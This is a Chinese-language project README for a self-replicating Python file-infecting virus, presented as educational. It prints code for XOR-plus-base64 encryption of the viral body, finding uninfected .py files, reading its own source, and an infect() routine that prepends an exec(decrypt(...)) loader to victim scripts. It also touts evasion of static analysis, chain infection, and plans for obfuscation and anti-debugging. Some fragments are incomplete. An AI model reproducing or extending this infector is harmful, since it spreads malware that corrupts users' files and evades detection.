# Python病毒实验

这是一个精心设计的教育目的Python病毒实现。该病毒展示了创新的加密感染机制和优雅的病毒传播策略，同时确保了安全和可控的执行环境。本实现展示了高度的代码模块化、先进的加密技术和优秀的软件工程实践。

## 技术亮点

### 1. 先进的加密感染机制
病毒实现了高度安全的加密传播机制：
```python
def encrypt_code(code: str, key: int = None) -> tuple[str, int]:
    """使用异或加密和base64编码对代码进行加密"""
    if key is None:
        key = random.randint(1, 255)  # 生成随机密钥
    # 对每个字符进行异或加密
    encrypted = ''.join(chr(ord(c) ^ key) for c in code)
    # 使用base64编码处理加密后的数据
    encoded = base64.b64encode(encrypted.encode()).decode()
    return encoded, key

def decrypt(c, k):
    """解密加密后的代码"""
    try:
        # base64解码
        d = base64.b64decode(c).decode()
        # 使用相同的密钥进行异或解密
        return ''.join(chr(ord(x) ^ k) for x in d)
    except:
        return ''
```
- 使用异或（XOR）运算进行加密：
  * 每个字符与随机密钥进行异或操作
  * 利用异或运算的可逆性（A^B^B = A）实现解密
  * 运算速度快，实现简单但有效
  * 每次感染使用不同的随机密钥（1-255）
- 使用Base64编码处理加密数据：
  * 确保加密后的数据可以安全存储和传输
  * 避免特殊字符造成的问题
- 加密过程：
  1. 原始代码 → 异或加密 → Base64编码 → 存储
  2. 存储数据 → Base64解码 → 异或解密 → 执行代码
- 设计了紧凑高效的解密器，确保感染代码最小化
- 加密后的代码难以被静态分析，提高隐蔽性
- 被感染文件保持完整的加密传播能力
- 支持加密代码的连环传播：A(加密) → B(加密) → C(加密)

### 2. 优秀的代码组织结构
- 采用模块化设计，每个功能都被封装在独立的函数中
- 代码结构清晰，便于维护和理解
- 函数命名语义化，如`get_virus()`, `infect()`, `find_target()`等
- 完整的异常处理机制，提高代码健壮性
- 详细的日志记录系统，便于追踪和调试

### 3. 智能的目标识别机制
病毒通过多重过滤确保只感染合适的Python脚本：
```python
def find_target():
    """查找可感染的目标文件"""
    try:
        python_files = []
        for file in os.listdir('.'):
            if file.endswith('.py') and file != os.path.basename(__file__):
                if '# --- VIRUS CODE START ---' not in content:
                    python_files.append(file)
```
- 使用`os.listdir('.')`高效获取当前目录文件列表
- 通过文件扩展名精确识别Python脚本
- 智能排除自身文件，避免自我感染
- 使用特征码检测防止重复感染

### 4. 可靠的文件处理机制
病毒实现了安全的文件读写操作：
```python
def get_virus():
    """获取病毒代码"""
    try:
        with open(__file__, 'r') as f:
            lines = f.readlines()
        # ... 处理逻辑 ...
```
- 使用`with`语句确保文件正确关闭
- 采用安全的文件读写方式
- 保持原始文件的完整性
- 错误处理机制完善

### 5. 高效的病毒传播策略
病毒采用加密传播策略，确保代码安全：
```python
def infect(target_file):
    """感染目标文件"""
    try:
        virus_code = get_virus()
        if virus_code is None:
            return False
        encrypted_code, key = encrypt_code(virus_code)
        decryptor = f"""
import base64
def decrypt(c,k):
 try:
  d=base64.b64decode(c).decode()
  return ''.join(chr(ord(x)^k)for x in d)
 except:return''
exec(decrypt('{encrypted_code}',{key}))
"""
        with open(target_file, 'w') as f:
            f.write(decryptor + original_code)
```
- 病毒代码在传播前进行加密处理
- 每个被感染文件使用独特的随机密钥
- 解密器代码经过优化，体积小巧
- 保持原始文件功能的同时获得加密传播能力
- 支持多层级的加密连环感染

### 6. 完善的日志系统
```python
logging.basicConfig(
    filename='./virus.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
```
- 记录所有关键操作和错误信息
- 包含时间戳和详细的状态信息
- 便于追踪病毒传播路径
- 有助于分析和调试

## 安全特性

### 1. 环境检测机制
```python
def check_environment():
    """检查运行环境的安全性"""
    current_dir = os.path.basename(os.getcwd())
    if not (current_dir == 'test' or 'test' in current_dir.lower()):
        logging.warning("不在测试目录中，为安全起见停止执行")
        return False
```
- 严格的目录限制
- 权限检查
- 运行环境验证
- 防止意外传播

### 2. 感染控制
- 加密传播策略，提高安全性
- 防止重复感染
- 保护系统文件
- 可控的传播范围

### 3. 统计和监控
```python
def get_infection_stats():
    """获取感染统计信息"""
    # 统计感染情况
    stats = f"感染统计 - 总Python文件数: {total_py_files}, 已感染文件数: {infected_count}"
    logging.info(stats)
```
- 实时统计感染情况
- 监控传播状态
- 提供详细的统计信息
- 便于实验分析

### 4. 代码保护
- 病毒代码使用异或加密和base64编码双重保护
- 每次感染使用随机密钥，提高安全性
- 解密器代码经过优化和混淆
- 加密传播链难以被静态分析
- 支持多层级的加密传播

## 教育价值

### 1. 编程技术展示
- 加密算法的实践应用
- 文件操作的最佳实践
- 异常处理的规范实现
- 日志系统���专业应用
- 模块化设计的示范

### 2. 安全意识培养
- 理解现代病毒的加密传播机制
- 认识代码加密的重要性
- 学习安全编程实践
- 培养安全编程习惯
- 了解病毒技术发展趋势

### 3. 实验价值
- 展示真实的病毒工作原理
- 提供可控的实验环境
- 便于分析和学习
- 安全可靠的教学工具
- 展示现代病毒技术

## 运行示例

1. 创建测试环境：
```bash
# 创建目录结构
mkdir -p VIRUS/test
cd VIRUS

# 复制测试文件到test目录
cp scripts/* test/
cp src/virus.py test/

# 进入测试目录
cd test
```

2. 运行病毒程序：
```bash
python3 virus.py
```

3. 检查感染结果：
```bash
# 查看某个Python文件是否被感染
cat hello.py

# 查看感染日志
cat virus.log
```

## 实验建议

1. **环境准备**
   - 使用隔离的测试环境
   - 准备多个测试文件
   - 确保目录权限正确

2. **实验步骤**
   - 观察初始感染过程
   - 测试连环感染能力
   - 分析日志记录
   - 验证安全机制
   - 分析加密效果

3. **注意事项**
   - 仅在测试环境中运行
   - 不要在生产环境使用
   - 注意保护重要文件
   - 遵守实验规范

## 改进方向

1. **功能增强**
   - 实现更多加密算法选项
   - 支持递归目录扫描
   - 添加更多感染策略
   - 实现配置系统
   - 增加自动化测试

2. **安全性提升**
   - 实现多层加密机制
   - 添加代码混淆功能
   - 实现反调试技术
   - 加强环境检测
   - 添加代码签名

3. **监控优化**
   - 完善加密传播追踪
   - 增加可视化功能
   - 优化日志分析
   - 添加报告生成
   - 加密效果分析